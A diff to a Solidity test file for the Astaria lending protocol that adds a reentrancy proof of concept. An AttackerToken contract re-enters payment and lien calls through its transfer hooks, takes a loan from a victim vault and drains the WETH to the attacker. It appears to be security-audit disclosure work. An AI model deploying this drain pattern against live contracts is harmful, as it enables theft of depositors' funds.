@@ -170,7 +170,7 @@ contract AstariaTest is TestHelpers {
 
     vm.warp(block.timestamp + 9 days);
 
-    _repay(stack, 0, 10 ether, address(this));
+    _repay(stack, 0, 11 ether, address(this));
   }
 
   function testBasicPrivateVaultLoan() public {
@@ -1440,5 +1440,174 @@ contract AstariaTest is TestHelpers {
       yInterceptWithFullWithdrawals,
       "YIntercepts do not match"
     );
+  }
+
+  function testReentrancyVuln() public {
+    uint256 alicePK = uint256(0x8888); // malicious user
+    address alice = vm.addr(alicePK);
+    address bob = address(2); // normal user
+    AttackerToken AT = new AttackerToken();
+
+    address victimVault = _createPublicVault({
+      strategist: strategistOne,
+      delegate: strategistTwo,
+      epochLength: 14 days
+    });
+
+    _lendToVault(Lender({addr: bob, amountToLend: 100 ether}), victimVault);
+
+    vm.startPrank(alice);
+    TestNFT nft = new TestNFT(2);
+    address tokenContract = address(nft);
+    uint256 tokenId = uint256(0);
+    uint256 tokenId2 = uint256(1);
+    address attackerVault = ASTARIA_ROUTER.newPublicVault(
+      14 days,
+      alice,
+      address(AT),
+      0,
+      false,
+      new address[](0),
+      uint256(0)
+    );
+    console.log("Attacker balance before: ", WETH9.balanceOf(alice));
+    (uint256[] memory liens, ILienToken.Stack[] memory stack) = _commitToLien({
+      vault: attackerVault,
+      strategist: alice,
+      strategistPK: alicePK,
+      tokenContract: tokenContract,
+      tokenId: tokenId,
+      lienDetails: ILienToken.Details({
+        maxAmount: 100 ether,
+        rate: (uint256(1e16) * 150) / (365 days),
+        duration: 10 days,
+        maxPotentialDebt: 100 ether,
+        liquidationInitialAsk: 500 ether
+      }),
+      amount: 90 ether,
+      isFirstLien: true
+    });
+
+    COLLATERAL_TOKEN.safeTransferFrom(
+      alice,
+      address(AT),
+      stack[0].lien.collateralId
+    );
+
+    AT.setAttack(
+      victimVault,
+      stack[0],
+      tokenContract,
+      tokenId,
+      LIEN_TOKEN,
+      COLLATERAL_TOKEN,
+      ASTARIA_ROUTER
+    );
+
+    stack = LIEN_TOKEN.makePayment(
+      stack[0].lien.collateralId,
+      stack,
+      0,
+      5 ether
+    );
+
+    // verifies that the lien with victimVault isn't included in the collateralState
+    assertEq(stack.length, 1);
+    assertEq(tokenContract.computeId(tokenId), stack[0].lien.collateralId);
+    assertEq(
+      keccak256(abi.encode(stack)),
+      LIEN_TOKEN.getCollateralState(tokenContract.computeId(tokenId))
+    );
+    assertEq(stack[0].lien.vault, attackerVault);
+
+    AT.drain(WETH9);
+    vm.stopPrank();
+
+    console.log("Attacker balance after: ", WETH9.balanceOf(alice));
+  }
+}
+
+contract AttackerToken is TestHelpers {
+  using CollateralLookup for address;
+  bool attack = false;
+  address victim;
+  ILienToken.Stack[] stack;
+  address tokenContract;
+  uint256 tokenId;
+  ILienToken lienToken;
+  ICollateralToken collatToken;
+  IAstariaRouter router;
+
+  mapping(address => uint256) public balances;
+
+  function transferFrom(
+    address from,
+    address to,
+    uint256 amount
+  ) public returns (bool) {
+    balances[to] += amount;
+    if (attack) {
+      attack = false;
+      _startAttack();
+    }
+    return true;
+  }
+
+  function transfer(address to, uint256 amount) public returns (bool) {
+    balances[to] += amount;
+    if (attack) {
+      attack = false;
+      _startAttack();
+    }
+    return true;
+  }
+
+  function setAttack(
+    address _victim,
+    ILienToken.Stack memory _stack,
+    address _tokenContract,
+    uint256 _tokenId,
+    ILienToken _lienToken,
+    ICollateralToken _collatToken,
+    IAstariaRouter _router
+  ) public {
+    attack = true;
+    victim = _victim;
+    stack.push(_stack);
+    tokenContract = _tokenContract;
+    tokenId = _tokenId;
+    lienToken = _lienToken;
+    collatToken = _collatToken;
+    router = _router;
+  }
+
+  function _startAttack() private {
+    lienToken.makePayment(stack[0].lien.collateralId, stack, 0, 10000 ether);
+
+    IAstariaRouter.Commitment[]
+      memory commitments = new IAstariaRouter.Commitment[](1);
+
+    ILienToken.Stack[] memory emptyStack = new ILienToken.Stack[](0);
+
+    commitments[0] = _generateValidTerms({
+      vault: victim,
+      strategist: strategistOne,
+      strategistPK: strategistOnePK,
+      tokenContract: tokenContract,
+      tokenId: tokenId,
+      lienDetails: standardLienDetails,
+      amount: 10 ether,
+      stack: emptyStack
+    });
+    collatToken.setApprovalForAll(address(router), true);
+    router.commitToLiens(commitments);
+  }
+
+  function drain(ERC20 WETH9) public {
+    WETH9.transfer(msg.sender, WETH9.balanceOf(address(this)));
+  }
+
+  function balanceOf(address account) public view returns (uint256) {
+    return balances[account];
   }
 }
